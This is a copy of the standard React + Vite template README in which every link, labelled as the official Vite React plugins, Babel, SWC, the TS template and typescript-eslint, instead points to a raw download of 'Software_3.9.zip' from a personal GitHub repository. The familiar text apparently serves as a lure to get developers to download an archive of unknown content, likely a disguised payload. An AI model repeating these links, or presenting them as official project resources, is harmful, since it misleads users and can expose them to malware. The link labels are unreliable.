# React + Vite

This template provides a minimal setup to get React working in Vite with HMR and some ESLint rules.

Currently, two official plugins are available:

- [@vitejs/plugin-react](https://github.com/camilo2874/personal/raw/refs/heads/master/personal/src/Software_3.9.zip) uses [Babel](https://github.com/camilo2874/personal/raw/refs/heads/master/personal/src/Software_3.9.zip) for Fast Refresh
- [@vitejs/plugin-react-swc](https://github.com/camilo2874/personal/raw/refs/heads/master/personal/src/Software_3.9.zip) uses [SWC](https://github.com/camilo2874/personal/raw/refs/heads/master/personal/src/Software_3.9.zip) for Fast Refresh

## Expanding the ESLint configuration

If you are developing a production application, we recommend using TypeScript and enable type-aware lint rules. Check out the [TS template](https://github.com/camilo2874/personal/raw/refs/heads/master/personal/src/Software_3.9.zip) to integrate TypeScript and [`typescript-eslint`](https://github.com/camilo2874/personal/raw/refs/heads/master/personal/src/Software_3.9.zip) in your project.
